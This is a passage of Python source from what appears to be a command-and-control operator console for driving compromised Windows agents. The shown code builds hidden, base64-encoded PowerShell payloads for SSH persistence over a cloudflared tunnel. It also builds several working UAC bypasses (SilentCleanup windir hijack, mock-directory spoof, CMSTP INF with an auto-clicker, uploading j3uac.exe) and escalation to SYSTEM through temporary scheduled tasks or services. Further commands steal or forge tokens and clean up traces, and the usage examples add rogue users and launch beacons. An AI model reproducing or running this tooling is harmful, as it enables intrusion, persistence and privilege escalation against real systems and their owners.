            console.print("[dim]  (works silently when ConsentPromptBehaviorAdmin=0)[/dim]")
            console.print()
            console.print("[dim]  Example: persist ssh sshuser Pass@12345[/dim]")
            console.print("[dim]  Example: persist ssh sshuser Pass@12345 eyJhIjoiM2Rh...token...[/dim]")
            return

        agent = self.client.agents.get(self.current_agent_id)
        if not agent:
            console.print("[red]Agent not found[/red]")
            return

        username = args[1] if len(args) > 1 else "default"
        password = args[2] if len(args) > 2 else "Pass123"
        cf_token = args[3] if len(args) > 3 else ""

        ps_script = self._PERSIST_SSH_PS1.replace("__USER__", username).replace("__PASS__", password)
        if cf_token:
            ps_script = ps_script.replace("__CF_TOKEN__", cf_token)
        else:
            ps_script = ps_script.replace("__CF_TOKEN__", "")

        if not agent.elevated:
            console.print("[yellow]Agent not elevated — auto-elevating via RunAs UAC bypass[/yellow]")
            self._persist_ssh_elevated(ps_script, username, password)
        else:
            ps_bytes = ps_script.encode("utf-16-le")
            ps_b64 = base64.b64encode(ps_bytes).decode("ascii")
            cmd = f'ps run powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {ps_b64}'

            cf_msg = f" + cloudflared tunnel" if cf_token else ""
            console.print(f"[dim]Deploying SSH persistence (user={username}){cf_msg}...[/dim]")
            try:
                self.client.agent_command_raw(self.current_agent_id, cmd)
                console.print("[green]Persist SSH command sent.[/green]")
                console.print(f"[dim]Credentials: {username} / {password}[/dim]")
                console.print("[dim]Monitor output for progress (7 steps). OpenSSH install may take a minute.[/dim]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")

    def _persist_ssh_elevated(self, ps_script, username, password):
        """Deploy SSH persistence via UAC bypass.

        Uses Start-Process -Verb RunAs (silent when ConsentPromptBehaviorAdmin=0).

        Step 1: Write persist PS1 to target.
        Step 2: Launch elevated via RunAs (ShellExecuteEx).
        """
        import random, string
        tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

        script_b64 = base64.b64encode(ps_script.encode("utf-8")).decode("ascii")
        # Try Public first, fall back to TEMP if disk is full
        writer_ps = (
            f'$b = [System.Convert]::FromBase64String("{script_b64}"); '
            f'$c = [System.Text.Encoding]::UTF8.GetString($b); '
            f'$candidates = @("C:\\Users\\Public\\ps_{tag}.ps1", "$env:TEMP\\ps_{tag}.ps1", "$env:APPDATA\\ps_{tag}.ps1"); '
            f'$sp = $null; '
            f'foreach ($p in $candidates) {{ try {{ [System.IO.File]::WriteAllText($p, $c); $sp = $p; break }} catch {{}} }}; '
            f'if ($sp) {{ Write-Host $sp }} else {{ Write-Host "WRITEFAIL" }}'
        )
        writer_b64 = base64.b64encode(writer_ps.encode("utf-16-le")).decode("ascii")

        console.print(f"[dim]Step 1: Writing persist script (auto-path)...[/dim]")
        try:
            self.client.agent_command_raw(
                self.current_agent_id,
                f"ps run -o powershell.exe -ExecutionPolicy Bypass -EncodedCommand {writer_b64}",
            )
        except Exception as e:
            console.print(f"[red]Failed to write script: {e}[/red]")
            return

        # Wait briefly and check task output for the resolved path
        import time as _time
        _time.sleep(4)
        script_path = None
        try:
            tasks = self.client.task_list(self.current_agent_id, limit=3)
            for t in tasks:
                txt = t.get("a_text", "").strip()
                if txt and "WRITEFAIL" in txt:
                    console.print("[red]Step 1 failed: no writable path found (all disks full?)[/red]")
                    return
                # Output is the resolved path
                for line in txt.splitlines():
                    line = line.strip()
                    if line.endswith(".ps1") and "ps_" + tag in line:
                        script_path = line
                        break
                if script_path:
                    break
        except Exception:
            pass

        if not script_path:
            # Fallback: assume Public worked (task may not have returned yet)
            script_path = f"C:\\Users\\Public\\ps_{tag}.ps1"
            console.print(f"[dim]  Path not confirmed yet, assuming {script_path}[/dim]")
        else:
            console.print(f"[dim]  Script written to: {script_path}[/dim]")

        console.print("[dim]Step 2: Elevating via SilentCleanup UAC bypass...[/dim]")
        # SilentCleanup abuses the auto-elevate DiskCleanup scheduled task:
        # hijack HKCU\Environment\windir → cmd.exe /C <our script> & rem
        # then trigger SilentCleanup which runs elevated without a UAC prompt.
        silentclean_ps = (
            f'try {{ '
            f'$sp = "{script_path}"; '
            f'$regKey = "HKCU:\\Environment"; '
            f'$cmd = "cmd.exe /C powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"$sp\\" & rem "; '
            f'Set-ItemProperty -Path $regKey -Name "windir" -Value $cmd -ErrorAction Stop; '
            f'schtasks /Run /TN "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" /I 2>&1 | Out-Null; '
            f'Start-Sleep -Seconds 5; '
            f'Remove-ItemProperty -Path $regKey -Name "windir" -ErrorAction SilentlyContinue; '
            f'Write-Host "[+] SilentCleanup UAC bypass launched" '
            f'}} catch {{ '
            f'Write-Host "[-] SilentCleanup failed: $_" '
            f'}}'
        )
        silentclean_b64 = base64.b64encode(silentclean_ps.encode("utf-16-le")).decode("ascii")
        try:
            self.client.agent_command_raw(
                self.current_agent_id,
                f"ps run -o powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {silentclean_b64}",
            )
        except Exception as e:
            console.print(f"[red]UAC bypass failed: {e}[/red]")
            return

        console.print("[green]SilentCleanup bypass sent.[/green]")

        # Step 3: j3uac CMSTP bypass fallback (auto-clicks UAC dialog, requires GUI session)
        j3uac_local = os.path.join(os.path.dirname(__file__), "data", "j3uac.exe")
        if not os.path.isfile(j3uac_local):
            # Try /tmp/j3uac.exe as last resort
            j3uac_local = "/tmp/j3uac.exe"

        if os.path.isfile(j3uac_local):
            console.print("[dim]Step 3: j3uac CMSTP UAC bypass (auto-click)...[/dim]")
            j3uac_remote = f"C:\\Users\\Public\\j3uac_{tag}.exe"
            bat_path = f"C:\\Users\\Public\\j3_{tag}.cmd"

            # Write wrapper .cmd on target via PS (base64-encode content to avoid quoting issues)
            bat_content = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{script_path}"'
            bat_content_b64 = base64.b64encode(bat_content.encode("utf-8")).decode("ascii")
            write_bat_ps = (
                f'$bc = [System.Convert]::FromBase64String("{bat_content_b64}"); '
                f'[System.IO.File]::WriteAllBytes("{bat_path}", $bc); '
                f'Write-Host "bat written"'
            )
            write_bat_b64 = base64.b64encode(write_bat_ps.encode("utf-16-le")).decode("ascii")
            try:
                self.client.agent_command_raw(
                    self.current_agent_id,
                    f"ps run -o powershell.exe -ExecutionPolicy Bypass -EncodedCommand {write_bat_b64}",
                )
            except Exception as e:
                console.print(f"[yellow]  Wrapper .cmd write failed: {e}[/yellow]")

            # Upload j3uac.exe
            try:
                _time.sleep(2)
                file_id = self.client.upload_temp_file(j3uac_local)
                self.client.agent_command_execute(
                    self.current_agent_id,
                    f"upload {j3uac_remote}",
                    data={"command": "upload", "local_file": {"__file_ref": file_id}, "remote_path": j3uac_remote},
                )
                console.print(f"[dim]  j3uac uploaded → {j3uac_remote}[/dim]")
            except Exception as e:
                console.print(f"[yellow]  j3uac upload failed: {e}[/yellow]")

            # Poll until j3uac and bat exist on target (max 45s)
            console.print("[dim]  Waiting for agent to receive j3uac.exe...[/dim]")
            verify_ps = (
                f'$j = Test-Path "{j3uac_remote}"; $b = Test-Path "{bat_path}"; '
                f'Write-Host "j3uac=$j bat=$b"'
            )
            verify_b64 = base64.b64encode(verify_ps.encode("utf-16-le")).decode("ascii")
            verify_ok = False
            for _attempt in range(9):
                _time.sleep(5)
                try:
                    self.client.agent_command_raw(
                        self.current_agent_id,
                        f"ps run -o powershell.exe -ExecutionPolicy Bypass -EncodedCommand {verify_b64}",
                    )
                except Exception:
                    pass
                _time.sleep(3)
                try:
                    tasks = self.client.task_list(self.current_agent_id, limit=5)
                    for t in tasks:
                        txt = (t.get("a_text", "") or "").strip()
                        if "j3uac=True" in txt:
                            verify_ok = True
                            break
                except Exception:
                    pass
                if verify_ok:
                    break
            if not verify_ok:
                console.print("[yellow]  j3uac not confirmed on disk yet — proceeding anyway[/yellow]")

            # Run j3uac.exe -p "cmd /c wrapper.cmd" with captured output
            j3out = f"C:\\Users\\Public\\j3out_{tag}.txt"
            run_j3uac_ps = (
                f'if (Test-Path "{j3uac_remote}") {{ '
                f'  $p = Start-Process -FilePath "{j3uac_remote}" '
                f'  -ArgumentList @("-p", "cmd /c \\"{bat_path}\\"") '
                f'  -Wait -PassThru -WindowStyle Normal '
                f'  -RedirectStandardOutput "{j3out}"; '
                f'  $o = Get-Content "{j3out}" -EA SilentlyContinue; '
                f'  Write-Host "j3uac exit=$($p.ExitCode) out=[$($o -join "; ")]"; '
                f'  Remove-Item "{j3out}" -Force -EA SilentlyContinue '
                f'}} else {{ Write-Host "j3uac not found on disk" }}'
            )
            run_j3uac_b64 = base64.b64encode(run_j3uac_ps.encode("utf-16-le")).decode("ascii")
            try:
                self.client.agent_command_raw(
                    self.current_agent_id,
                    f"ps run -o powershell.exe -ExecutionPolicy Bypass -EncodedCommand {run_j3uac_b64}",
                )
                console.print("[green]Persist SSH sent via j3uac CMSTP bypass[/green]")
            except Exception as e:
                console.print(f"[red]j3uac launch failed: {e}[/red]")
        else:
            console.print("[yellow]  j3uac.exe not found locally — skipping CMSTP step[/yellow]")

        console.print(f"[dim]Credentials: {username} / {password}[/dim]")
        console.print("[dim]Monitor output for progress (allow 2-3 min for OpenSSH install).[/dim]")

        cleanup_ps = (
            f'Start-Sleep -Seconds 180; '
            f'Remove-Item "{script_path}" -Force -ErrorAction SilentlyContinue; '
            f'Remove-Item "C:\\Users\\Public\\j3_{tag}.cmd" -Force -ErrorAction SilentlyContinue; '
            f'Remove-Item "C:\\Users\\Public\\j3uac_{tag}.exe" -Force -ErrorAction SilentlyContinue'
        )
        cleanup_b64 = base64.b64encode(cleanup_ps.encode("utf-16-le")).decode("ascii")
        try:
            self.client.agent_command_raw(
                self.current_agent_id,
                f"ps run -o powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {cleanup_b64}",
            )
        except Exception:
            pass

    # ─── Privilege escalation ────────────────────────────────────────

    # PowerShell UAC bypass via mock trusted directory (windir env spoofing)
    # SilentCleanup scheduled task runs as high integrity and expands %windir%
    # We set user-level windir="C:\Windows " (trailing space), create mock
    # System32 dir there, and place a CMD wrapper as the target executable
    _UAC_MOCKDIR_PS1 = r'''
$cmd = "__CMD__"

Write-Host "[*] UAC bypass via SilentCleanup + windir spoof..."

# Create mock dir: "C:\Windows \System32\"
$mockBase = "C:\Windows "
$mockDir = "$mockBase\System32"
New-Item -ItemType Directory -Path $mockDir -Force -ErrorAction SilentlyContinue | Out-Null

# Write payload launcher — SilentCleanup runs %windir%\System32\cleanmgr.exe
# We place our own cleanmgr.exe (batch wrapper) in the mock dir
$wrapperPath = "$mockDir\cleanmgr.exe"
$batContent = "@echo off`r`n$cmd"
[System.IO.File]::WriteAllText($wrapperPath, $batContent)
Write-Host "[*] Payload written to: $wrapperPath"

# Save and spoof windir
$origWinDir = [System.Environment]::GetEnvironmentVariable("windir", "User")
[System.Environment]::SetEnvironmentVariable("windir", $mockBase, "User")
Write-Host "[*] Env windir spoofed to: $mockBase"

# Trigger SilentCleanup — runs elevated, expands %windir% from user env
schtasks.exe /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I 2>&1 | Out-Null
Write-Host "[*] SilentCleanup triggered"
Start-Sleep -Seconds 5

# Restore env
if ($origWinDir) {
    [System.Environment]::SetEnvironmentVariable("windir", $origWinDir, "User")
} else {
    [System.Environment]::SetEnvironmentVariable("windir", $null, "User")
}
Write-Host "[*] Env restored"

# Cleanup mock dir
Start-Sleep -Seconds 2
Remove-Item -Path $mockBase -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[+] UAC bypass completed"
'''

    # PowerShell UAC bypass via cmstp.exe (reliable version)
    # Uses Start-Job with WScript.Shell to find and click the cmstp dialog
    _UAC_CMSTP_PS1 = r'''
$cmd = "__CMD__"
$svcName = -join ((65..90)+(97..122) | Get-Random -Count 8 | % {[char]$_})

$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDest
RunPreSetupCommands=RunPreSetupCommandsSection
[CustInstDest]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="$svcName"
ShortSvcName="$svcName"
UnexpectedError=""
[RunPreSetupCommandsSection]
$cmd
taskkill /IM cmstp.exe /F
"@

$infPath = "$env:TEMP\$(Get-Random).inf"
$inf | Out-File -FilePath $infPath -Encoding ASCII

Write-Host "[*] UAC bypass via cmstp.exe (svc: $svcName)..."

# Start clicker as background job BEFORE launching cmstp
$clickJob = Start-Job -ScriptBlock {
    param($svc)
    $ws = New-Object -ComObject WScript.Shell
    for ($i = 0; $i -lt 30; $i++) {
        Start-Sleep -Milliseconds 500
        $activated = $false
        if ($ws.AppActivate($svc)) { $activated = $true }
        elseif ($ws.AppActivate("Connection Manager")) { $activated = $true }
        if ($activated) {
            Start-Sleep -Milliseconds 500
            # Try multiple key combos: ALT+I for Install, then TAB+ENTER
            $ws.SendKeys("%i")
            Start-Sleep -Milliseconds 200
            $ws.SendKeys("{TAB}{ENTER}")
            Start-Sleep -Milliseconds 200
            $ws.SendKeys("{ENTER}")
            return "clicked"
        }
    }
    return "timeout"
} -ArgumentList $svcName

Start-Process -FilePath "C:\Windows\System32\cmstp.exe" -ArgumentList "/au `"$infPath`"" -WindowStyle Normal

$result = $clickJob | Wait-Job -Timeout 20 | Receive-Job
Write-Host "[*] Clicker result: $result"
Remove-Job $clickJob -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 3
Remove-Item -Path $infPath -Force 2>$null
Write-Host "[+] UAC bypass completed"
'''

    # Escalate admin → SYSTEM via scheduled task (primary) or service (fallback)
    _GETSYSTEM_TASK_PS1 = r'''
$cmd = "__CMD__"
$taskName = "AxTask" + (Get-Random -Minimum 1000 -Maximum 9999)
Write-Host "[*] Creating scheduled task $taskName as SYSTEM..."
schtasks /create /tn $taskName /tr "cmd.exe /c $cmd" /sc once /st 00:00 /ru SYSTEM /f 2>&1 | Out-Null
Write-Host "[*] Running task..."
schtasks /run /tn $taskName 2>&1 | Out-Null
Start-Sleep -Seconds 3
Write-Host "[*] Cleaning up..."
schtasks /delete /tn $taskName /f 2>&1 | Out-Null
Write-Host "[+] Task executed as SYSTEM"
'''

    _GETSYSTEM_SVC_PS1 = r'''
$cmd = "__CMD__"
$svcName = "AxSvc" + (Get-Random -Minimum 1000 -Maximum 9999)
Write-Host "[*] Creating service $svcName as SYSTEM..."
sc.exe create $svcName binPath= "cmd.exe /c $cmd" type= own start= demand 2>&1 | Out-Null
Write-Host "[*] Starting service..."
sc.exe start $svcName 2>&1 | Out-Null
Start-Sleep -Seconds 3
Write-Host "[*] Cleaning up..."
sc.exe delete $svcName 2>&1 | Out-Null
Write-Host "[+] Service executed as SYSTEM"
'''

    def _has_bof_command(self, cmd_name):
        """Check if a BOF command is registered (Extension-Kit loaded)."""
        agent = self.client.agents.get(self.current_agent_id)
        if not agent:
            return False
        try:
            cmds = self.client.get_agent_commands(agent.name)
            if any(c["name"] == cmd_name for c in cmds):
                return True
        except Exception:
            pass
        return cmd_name in self._extkit_commands

    _extkit_commands = {
        "getsystem", "uacbybass", "potato-dcom",
        "token", "inject", "shinject", "spawnas", "runas", "runas-user", "steal",
        "nanodump", "dcsync-all", "dcsync-single",
        "ldapsearch", "kerbeus", "adws", "sql",
        "noconsolation", "execute-assembly",
        "inject-sec", "inject-cfg", "inject-poolparty", "inject-32to64",
    }

    def _cmd_elevate(self, args, line):
        """Privilege escalation convenience commands."""
        agent = self.client.agents.get(self.current_agent_id)
        if not agent:
            console.print("[red]Agent not found[/red]")
            return

        if not args:
            self._elevate_help(agent)
            return

        subcmd = args[0].lower()

        if subcmd == "getsystem":
            self._elevate_getsystem(args[1:], agent)
        elif subcmd == "uac":
            self._elevate_uac(args[1:], agent)
        elif subcmd == "potato":
            self._elevate_potato(args[1:], agent)
        elif subcmd == "token":
            self._elevate_token(args[1:], agent)
        elif subcmd == "runas":
            self._elevate_runas(args[1:], agent)
        else:
            console.print(f"[yellow]Unknown elevate subcommand: {subcmd}[/yellow]")
            self._elevate_help(agent)

    def _elevate_help(self, agent):
        has_elevation = self._has_bof_command("getsystem")
        has_lateral = self._has_bof_command("token")

        t = Table(title="Privilege Escalation", box=box.ROUNDED)
        t.add_column("Command", style="cyan", no_wrap=True)
        t.add_column("Description")
        t.add_column("Requires", style="dim")

        t.add_row("elevate getsystem", "SYSTEM via token impersonation (BOF)", "Admin + ExtKit")
        t.add_row("elevate getsystem task|svc <cmd>", "Run cmd as SYSTEM via schtask/service", "Admin")
        t.add_row("elevate uac runas <cmd>", "ShellExecuteEx RunAs — silent, Defender-safe", "Medium + ConsentPrompt=0")
        t.add_row("elevate uac cmstp <cmd>", "CMSTP INF hijack (Win10 only, needs GUI)", "Medium integrity")
        t.add_row("elevate uac mockdir <cmd>", "SilentCleanup + windir env spoof", "Medium integrity")
        if has_elevation:
            t.add_row("elevate uac sspi <path>", "SSPI Datagram context token forge (BOF)", "Medium + ExtKit")
            t.add_row("elevate uac regshell <path>", "ms-settings registry + ComputerDefaults (BOF)", "Medium + ExtKit")
            t.add_row("elevate potato dcom [--token|--run <cmd>]", "DCOMPotato SYSTEM (BOF)", "SeImpersonate + ExtKit")
        if has_lateral:
            t.add_row("elevate token steal <pid>", "Steal access token from process (BOF)", "Admin + ExtKit")
            t.add_row("elevate token make <user> <pass> <domain> <type>", "Create impersonation token (BOF)", "Creds + ExtKit")
            t.add_row("elevate runas <user> <pass> <domain> <cmd>", "Run command as another user (BOF)", "Creds + ExtKit")

        console.print(t)

        status = []
        if has_elevation:
            status.append("[green]Elevation-BOF[/green]")
        if has_lateral:
            status.append("[green]LateralMovement-BOF[/green]")
        if not status:
            status.append("[yellow]No Extension-Kit BOFs detected (PowerShell fallbacks available)[/yellow]")
        console.print(f"[dim]Extensions: {', '.join(status)}[/dim]")

        elevated = "Yes" if agent.elevated else "No"
        console.print(f"[dim]Agent elevated: {elevated}[/dim]")

    def _elevate_getsystem(self, args, agent):
        if not agent.elevated:
            console.print("[yellow]Warning: agent may not have admin privileges. getsystem typically requires admin.[/yellow]")

        cmd_to_run = " ".join(args) if args else ""

        # BOF getsystem token — impersonates SYSTEM in current process
        if not cmd_to_run or cmd_to_run == "token":
            console.print("[dim]Sending getsystem token (BOF)...[/dim]")
            try:
                self.client.agent_command_raw(self.current_agent_id, "getsystem token")
                console.print("[green]getsystem token sent — agent impersonates SYSTEM + TrustedInstaller[/green]")
            except Exception as e:
                err = str(e)
                if "unknown" in err.lower() or "not found" in err.lower():
                    console.print("[yellow]Extension-Kit not loaded. Use task/svc fallback:[/yellow]")
                    console.print("[dim]  elevate getsystem task <cmd>   (scheduled task)[/dim]")
                    console.print("[dim]  elevate getsystem svc <cmd>    (service)[/dim]")
                else:
                    console.print(f"[red]Failed: {e}[/red]")
            return

        # Fallback: run arbitrary command as SYSTEM via task/service
        method = "task"
        if cmd_to_run.startswith("svc "):
            method = "svc"
            cmd_to_run = cmd_to_run[4:]
        elif cmd_to_run.startswith("task "):
            cmd_to_run = cmd_to_run[5:]

        if method == "task":
            ps_script = self._GETSYSTEM_TASK_PS1.replace("__CMD__", cmd_to_run)
            label = "scheduled task"
        else:
            ps_script = self._GETSYSTEM_SVC_PS1.replace("__CMD__", cmd_to_run)
            label = "service"

        ps_b64 = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
        cmd = f'ps run powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {ps_b64}'

        console.print(f"[dim]Creating temp {label} to run as SYSTEM...[/dim]")
        try:
            self.client.agent_command_raw(self.current_agent_id, cmd)
            console.print(f"[green]getsystem ({label}) command sent[/green]")
        except Exception as e:
            console.print(f"[red]Failed: {e}[/red]")

    def _elevate_uac(self, args, agent):
        if agent.elevated:
            console.print("[yellow]Agent is already elevated. UAC bypass not needed.[/yellow]")
            return

        if not args:
            console.print("[yellow]Usage: elevate uac <technique> <cmd>[/yellow]")
            console.print("[dim]  Techniques: runas (recommended), cmstp, mockdir, sspi (BOF), regshell (BOF)[/dim]")
            return

        technique = args[0].lower()

        if technique == "runas":
            if len(args) < 2:
                console.print("[yellow]Usage: elevate uac runas <command>[/yellow]")
                console.print("[dim]  Run a command as elevated (High integrity) via ShellExecuteEx RunAs[/dim]")
                console.print("[dim]  Silent elevation when ConsentPromptBehaviorAdmin=0 (UAC: Never notify)[/dim]")
                console.print("[dim]  Bypasses Defender — uses legitimate Windows elevation API[/dim]")
                console.print()
                console.print("[dim]  Example: elevate uac runas C:\\Users\\Public\\beacon.exe[/dim]")
                console.print("[dim]  Example: elevate uac runas net user hacker Pass123 /add[/dim]")
                return
            cmd_to_run = " ".join(args[1:])
            runas_ps = (
                f'try {{ '
                f'Start-Process -Verb RunAs -FilePath "cmd.exe" '
                f'-ArgumentList "/c {cmd_to_run}" '
                f'-WindowStyle Hidden -ErrorAction Stop; '
                f'Write-Host "[+] Elevated process launched: {cmd_to_run}" '
                f'}} catch {{ '
                f'Write-Host "[-] RunAs failed (needs ConsentPromptBehaviorAdmin=0): $_" '
                f'}}'
            )
            ps_b64 = base64.b64encode(runas_ps.encode("utf-16-le")).decode("ascii")
            cmd = f'ps run -o powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {ps_b64}'

            console.print(f"[dim]UAC bypass via RunAs → {cmd_to_run}[/dim]")
            try:
                self.client.agent_command_raw(self.current_agent_id, cmd)
                console.print("[green]UAC bypass (RunAs) sent[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")

        elif technique == "mockdir":
            if len(args) < 2:
                console.print("[yellow]Usage: elevate uac mockdir <command>[/yellow]")
                console.print("[dim]  SilentCleanup scheduled task + windir env variable spoofing[/dim]")
                console.print("[dim]  May be blocked by Defender — use 'runas' if available[/dim]")
                console.print("[dim]  Example: elevate uac mockdir C:\\Users\\Public\\beacon.exe[/dim]")
                return
            cmd_to_run = " ".join(args[1:])
            ps_script = self._UAC_MOCKDIR_PS1.replace("__CMD__", cmd_to_run)
            ps_bytes = ps_script.encode("utf-16-le")
            ps_b64 = base64.b64encode(ps_bytes).decode("ascii")
            cmd = f'ps run -o powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {ps_b64}'

            console.print(f"[dim]UAC bypass via mock trusted dir → {cmd_to_run}[/dim]")
            try:
                self.client.agent_command_raw(self.current_agent_id, cmd)
                console.print("[green]UAC bypass (mockdir/SilentCleanup) sent[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")

        elif technique == "cmstp":
            if len(args) < 2:
                console.print("[yellow]Usage: elevate uac cmstp <command>[/yellow]")
                console.print("[dim]  CMSTP.exe INF install hijack (Win10 only, needs GUI session)[/dim]")
                console.print("[dim]  Example: elevate uac cmstp C:\\Users\\Public\\beacon.exe[/dim]")
                return
            cmd_to_run = " ".join(args[1:])
            ps_script = self._UAC_CMSTP_PS1.replace("__CMD__", cmd_to_run)
            ps_bytes = ps_script.encode("utf-16-le")
            ps_b64 = base64.b64encode(ps_bytes).decode("ascii")
            console.print(f"[dim]UAC bypass via cmstp.exe → {cmd_to_run}[/dim]")
            try:
                self.client.agent_command_raw(
                    self.current_agent_id,
                    f"ps run -o powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {ps_b64}",
                )
                console.print("[green]UAC bypass (cmstp) sent[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")

        elif technique == "fodhelper":
            console.print("[yellow]fodhelper is patched on newer Windows. Use 'runas' instead.[/yellow]")
            console.print("[dim]  elevate uac runas <command>[/dim]")

        elif technique == "sspi":
            if not self._has_bof_command("uacbybass"):
                console.print("[red]SSPI UAC bypass requires Elevation-BOF extension[/red]")
                return
            if len(args) < 2:
                console.print("[yellow]Usage: elevate uac sspi <exe_path_on_target>[/yellow]")
                return
            path = args[1]
            try:
                self.client.agent_command_raw(self.current_agent_id, f'uacbybass sspi {path}')
                console.print("[green]UAC bypass (SSPI) sent[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")

        elif technique in ("regshell", "regshellcmd"):
            if not self._has_bof_command("uacbybass"):
                console.print("[red]RegShellCmd UAC bypass requires Elevation-BOF extension[/red]")
                return
            if len(args) < 2:
                console.print("[yellow]Usage: elevate uac regshell <exe_path_on_target>[/yellow]")
                return
            path = args[1]
            try:
                self.client.agent_command_raw(self.current_agent_id, f'uacbybass regshellcmd {path}')
                console.print("[green]UAC bypass (regshellcmd) sent[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")
        else:
            console.print(f"[yellow]Unknown UAC technique: {technique}[/yellow]")
            console.print("[dim]Available: runas (recommended), cmstp, mockdir, sspi (BOF), regshell (BOF)[/dim]")

    def _elevate_potato(self, args, agent):
        if not args:
            console.print("[yellow]Usage: elevate potato dcom [--token|--run <cmd>][/yellow]")
            return

        ptype = args[0].lower()
        if ptype != "dcom":
            console.print(f"[yellow]Unknown potato type: {ptype}. Use 'dcom'[/yellow]")
            return

        if not self._has_bof_command("potato-dcom"):
            console.print("[red]potato-dcom requires Elevation-BOF extension[/red]")
            return

        rest = " ".join(args[1:]) if len(args) > 1 else "--token"
        try:
            self.client.agent_command_raw(self.current_agent_id, f'potato-dcom {rest}')
            console.print("[green]potato-dcom command sent[/green]")
        except Exception as e:
            console.print(f"[red]Failed: {e}[/red]")

    def _elevate_token(self, args, agent):
        if not args:
            console.print("[yellow]Usage:[/yellow]")
            console.print("[yellow]  elevate token steal <pid>[/yellow]")
            console.print("[yellow]  elevate token make <user> <pass> <domain> <logon_type>[/yellow]")
            console.print("[dim]  Logon types: 2=Interactive 3=Network 8=NetCleartext 9=NewCredentials[/dim]")
            return

        if not self._has_bof_command("token"):
            console.print("[red]Token commands require LateralMovement-BOF extension[/red]")
            return

        subcmd = args[0].lower()
        if subcmd == "steal":
            if len(args) < 2:
                console.print("[yellow]Usage: elevate token steal <pid>[/yellow]")
                return
            pid = args[1]
            try:
                self.client.agent_command_raw(self.current_agent_id, f'token steal {pid}')
                console.print(f"[green]Token steal sent (PID {pid})[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")

        elif subcmd == "make":
            if len(args) < 5:
                console.print("[yellow]Usage: elevate token make <user> <pass> <domain> <logon_type>[/yellow]")
                console.print("[dim]  Example: elevate token make admin P@ssw0rd domain.local 9[/dim]")
                return
            user, passwd, domain, ltype = args[1], args[2], args[3], args[4]
            try:
                self.client.agent_command_raw(self.current_agent_id, f'token make {user} {passwd} {domain} {ltype}')
                console.print(f"[green]Token make sent ({domain}\\{user}, type {ltype})[/green]")
            except Exception as e:
                console.print(f"[red]Failed: {e}[/red]")
        else:
            console.print(f"[yellow]Unknown token subcommand: {subcmd}[/yellow]")

    def _elevate_runas(self, args, agent):
        if len(args) < 4:
            console.print("[yellow]Usage: elevate runas <user> <pass> <domain> <command>[/yellow]")
            console.print("[dim]  Example: elevate runas admin P@ss . \"cmd /c whoami\"[/dim]")
            console.print("[dim]  Options: -l <logon_type> -t <timeout_ms> -o (output) -b (bypass UAC)[/dim]")
            return

        if not self._has_bof_command("runas-user"):
            console.print("[red]runas-user requires LateralMovement-BOF extension[/red]")
            return

        rest = " ".join(args)
        try:
            self.client.agent_command_raw(self.current_agent_id, f'runas-user {rest}')
            console.print("[green]runas-user command sent[/green]")
        except Exception as e:
            console.print(f"[red]Failed: {e}[/red]")

    # ─── Agent control (sleep/jitter/note/color/upload/download) ────

    def _cmd_sleep(self, args, line):
        """Set agent sleep from main menu: sleep <agent_id> <seconds>"""
        if len(args) < 2:
            console.print("[yellow]Usage: sleep <agent_id> <seconds>[/yellow]")
            return
        match = self._find_agent(args[0])
        if not match:
            console.print(f"[red]Agent not found: {args[0]}[/red]")
            return
        try:
            self.client.agent_command_raw(match.id, f"sleep {args[1]}")
            console.print(f"[green]Sleep set to {args[1]}s for {match.id[:8]}[/green]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")

    def _cmd_jitter(self, args, line):
        """Set agent jitter from main menu: jitter <agent_id> <percent>"""
        if len(args) < 2:
            console.print("[yellow]Usage: jitter <agent_id> <percent>[/yellow]")
            return
        match = self._find_agent(args[0])
        if not match:
            console.print(f"[red]Agent not found: {args[0]}[/red]")
            return
        try:
            self.client.agent_command_raw(match.id, f"jitter {args[1]}")
            console.print(f"[green]Jitter set to {args[1]}% for {match.id[:8]}[/green]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")

    def _cmd_note(self, args, line):
        """Set agent note: note <agent_id> [text]"""
        if not args:
            console.print("[yellow]Usage: note <agent_id> [text][/yellow]")
            return
        match = self._find_agent(args[0])
        if not match:
            console.print(f"[red]Agent not found: {args[0]}[/red]")
            return
        note_text = " ".join(args[1:]) if len(args) > 1 else ""
        try:
            self.client.agent_set_mark([match.id], note_text)
            console.print(f"[green]Note set: {note_text or '(cleared)'}[/green]")
        except Exception as e:
            console.print(f"[red]{e}[/red]")

    def _cmd_subscribe(self, args, line):
        """Manage subscriptions: subscribe [add|remove|list] [categories...]"""
        if not args or args[0] == "list":
            from .client import DEFAULT_SUBSCRIPTIONS
            console.print("[bold]Current subscription categories:[/bold]")
            for cat in self.client._ws_subscriptions:
                console.print(f"  [cyan]{cat}[/cyan]")
            console.print(f"\n[dim]Available: {', '.join(DEFAULT_SUBSCRIPTIONS)}[/dim]")
            return
        if args[0] == "add" and len(args) > 1:
            cats = args[1:]
            current = list(self.client._ws_subscriptions)
            for c in cats:
